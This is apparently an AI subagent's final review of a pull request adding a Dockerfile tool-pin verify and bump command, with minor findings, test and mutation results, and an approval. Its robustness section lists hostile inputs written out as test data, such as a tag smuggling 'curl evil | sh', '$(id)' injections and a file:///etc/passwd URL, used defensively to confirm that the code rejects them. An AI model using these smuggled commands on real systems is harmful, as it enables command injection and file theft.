# Final review, pass 1 (track A)

- Reviewer: final-a (fresh subagent of the supervisor, claude-opus)
- Reviewed: ee9607c4031bd702f8c5ba4641731fa5b81787d1 (the whole branch; kit PR #241, ticket/kit-48-box-pins-command)

| Id | Severity | Rule | Where | Finding | Disposition |
|---|---|---|---|---|---|
| F1 | Minor | spec acceptance 1 (CI, every job) | PR #241 checks at ee9607c, test.yml run 43667157099 | `kit (22, rest)` was **cancelled at the 30-minute job timeout** (last output 02:22:51, cancelled 02:48:43; the reporter stopped after host-claim.test.mjs, so the stalled file can't be named from the log). The other 7 kit jobs and box-image `build` pass. The only change from 3bd1bc3 to ee9607c is verification.md, and at 3bd1bc3 every job passed (run 43666447843, `kit (22, rest)` in 297 s). Locally at ee9607c, machine.test.mjs passed 47/48. The one failure was kit-46's untouched drip-timing test ("status names the hub…"), which failed under load from my concurrent mutation runs and passed when run alone. So this looks like a flake, not a defect in this ticket, but CI at this exact head is red. Don't merge until a rerun of the failed job is green. | deferred (Minor): a CI timeout of kit (22, rest), not a test failure; the supervisor re-ran the job |
| F2 | Minor | spec verify problem 3 / acceptance 2 ("64 lowercase hex") | test/machine.test.mjs, verify cases | The bad-sum case is `ABC`, which has the wrong length. A mutation that accepts uppercase (`[0-9a-fA-F]{64}`) passes every test (M16 below). The code is right. The lowercase rule just has no test. | deferred (Minor): the code rejects uppercase; an uppercase-sum test case is a follow-up |
| F3 | Minor | spec Security ("GH_TOKEN is sent only to the GitHub API base") | devteam.mjs `upstreamJson` (fetch's default `redirect: 'follow'`) | A cross-origin redirect of an API request drops the `Authorization` header only because undici's fetch strips it. I confirmed this on Node 18.20.4 and 22.23.4, and with the kit itself: an API 302 to another origin arrived with no auth. No code or test pins it, though. `redirect: 'error'` (or `'manual'`) on API requests, or a fixture case, would. | deferred (Minor): the header is dropped on a cross-origin redirect by fetch itself; an explicit redirect: 'error' on API calls is a follow-up |
| F4 | Minor | spec bump step 4 (atomic, all-or-nothing) | devteam.mjs `cmdBoxPins` bump write | Bump reads the file, then spends up to 120 s per download, then renames over it without checking that the file is unchanged. An edit made during that window (say a `# hold:` added) is silently overwritten. Temp+rename is atomic for a crash (no fsync before the rename; ext4's rename heuristic covers most of that). | deferred (Minor): bump is run by hand in the release-prep checkout; a check that the file is unchanged before the rename is a follow-up |
| F5 | Minor | spec Edge cases ("A why is built from our own words…") | devteam.mjs `bumpPins` | A release whose `assets` is not an array prints a raw JS TypeError: `gh: ((intermediate value) ?? []).find is not a function; nothing written`. It's safe: no upstream text, and nothing is written. But it isn't our words. Similarly, an npm `version` of `["2.1.400"]` is coerced by `String()` and accepted. The written value is still a plain version, so nothing is injected. | deferred (Minor): safe, nothing written; a non-array assets guard is a follow-up |
| F6 | Suggestion | none | devteam.mjs `readPins` `argLines` | Dockerfile instructions are case-insensitive, and an indented or lowercase `arg GH_VERSION=…` would be honoured by BuildKit but not seen by verify. This matches the spec's `^ARG <NAME>=<value>$` rule, so it's not a defect. | deferred (Suggestion): matches the spec's ARG form and kit-47's rule; lowercase/indented ARGs are a follow-up |

## What I checked

- Read quality.md §3, then the spec, the plan's Rulings and Builder rulings, verification.md, the task-review verdicts (every task's latest pass approves), the kit-48 section of the design, and the full diff `origin/main...ee9607c` outside `docs/devteam-dev` (devteam.mjs +329, machine.test.mjs +479; no file added).
- Went through the spec against the code, item by item. Verify problems 1 to 8 all match the spec, including the stray regexes, the exempt lines, the `DEVTEAM_BOX_TOOLS` line regex, and the hold forms (exact form, empty reason, indented or any case, not directly above a tool's `_VERSION`). The builder's extra "not a plain version" problem was ruled in T2. Check: endpoints, `%2f`, `per_page=30` with draft, prerelease and plain-tag filtering, highest version, 15 s timeout, line formats, exit 1/3/0 and 2 on a broken file, and the `--json` shapes. Bump: refuses on structure problems and on an older `--release` (an equal one is allowed); downloads only for an unheld tool whose latest is newer; per-arch asset name from the table in pin form; a mismatched digest fails; the result is re-verified at `--release` in memory; temp file beside the real path, given the original's mode, then renamed; `unchanged`; `--dry-run`. Installed: `path.join(path.resolve(bin), file)` with no shell, so PATH is never searched; `UV_TOOL_DIR=/opt/uv/tools` only for `uv tool list`; 20 s timeout; normalised to the pin's form; exit codes; the machineWide and `DEVTEAM_RUN` exemptions apply only to `installed`.
- `box-pins verify` on the real `cloud/Dockerfile` gives `ok, 6 tools, release v0.52.0`.
- Tests, run as instructed: 47/48 at ee9607c. The one failure is the pre-existing kit-46 timing test under my machine's load, and it passes alone. Every new box-pins test passes (25/25 on a filtered run).
- CI: `gh pr checks 241` (see F1).

## What I tried to break, and how it held

Against a local fake npm, PyPI and GitHub, running the kit's `box-pins bump --release v0.52.1` and `check` on a copy of the real Dockerfile with `GH_TOKEN=SECRET`:

- **A GitHub tag with a newline** (`v2.105.0\nRUN curl evil | sh`), shell metacharacters (`v2.105.0;$(id)`), or an ESC sequence: filtered out as not a release. Check says `unknown no release`, bump says `gh: no release; nothing written`, and the file is byte-identical. `versionParts` is anchored with no `m` flag, and `newer()` is false whenever either side isn't plain, so a non-version can never be "newer" and written.
- **npm `version` with `&& curl x` or a newline:** `unknown not a release: ?`, and bump writes nothing.
- **Asset failures** all print a message, exit 1 and leave the file byte-identical: an aarch64 asset missing from the release, a bad aarch64 digest (after x86_64 was fine), a `file:///etc/passwd` download URL, and a truncated body (content-length 100, 5 bytes sent, socket destroyed, `UND_ERR_SOCKET`).
- **A release with no `digest`:** accepted, with the sums equal to the sha256 of the served bytes (the spec allows this).
- **Tokens:** every API request carried `Bearer SECRET`. Every download, every redirect target of a download (including one to another host), and every npm and PyPI request had no `Authorization`. An API 302 to another origin also arrived without it (F3).
- **Hold on gh:** no request to cli/cli, gh's lines unchanged, `held gh: testing` printed, and only `DEVTEAM_RELEASE` changed.
- **Mutations** of devteam.mjs in a scratch copy, each run against the box-pins tests:
  - M1, digest check removed: caught.
  - M2, token added to downloads: caught.
  - M3, re-verify removed: caught.
  - M4, hold skip removed in bump: caught.
  - M5, bare name looked up on PATH: caught (3 tests).
  - M6, `UV_TOOL_DIR` dropped: caught (2).
  - M7, older-`--release` refusal removed: caught.
  - M8, stray check off: caught (4).
  - M9, hold "directly above" loosened: caught (4).
  - M11, version regex unanchored: caught (2).
  - M12, pin form dropped (mise without its `v`): caught.
  - M14, prereleases taken: caught (2).
  - M15, `DEVTEAM_BOX_TOOLS` presence check off: caught.
  - M16, uppercase sums accepted: **survived** (F2).
  - M17, malformed holds ignored: caught (5).
  - M18, `safe()` made the identity: caught.
  - M19, download HTTP status ignored: caught.
- The atomic write was read in code, not tested by a crash. The original is only ever replaced by `renameSync` of a fully written temp file in the same directory. A failure before the rename removes the temp file and leaves the original. Every upstream failure dies before any write.

No Critical or Important defect was found in the code. F1 is a CI status at this head, not a code defect, and `merge` will not pass while it is red.

Verdict: APPROVE ee9607c4031bd702f8c5ba4641731fa5b81787d1
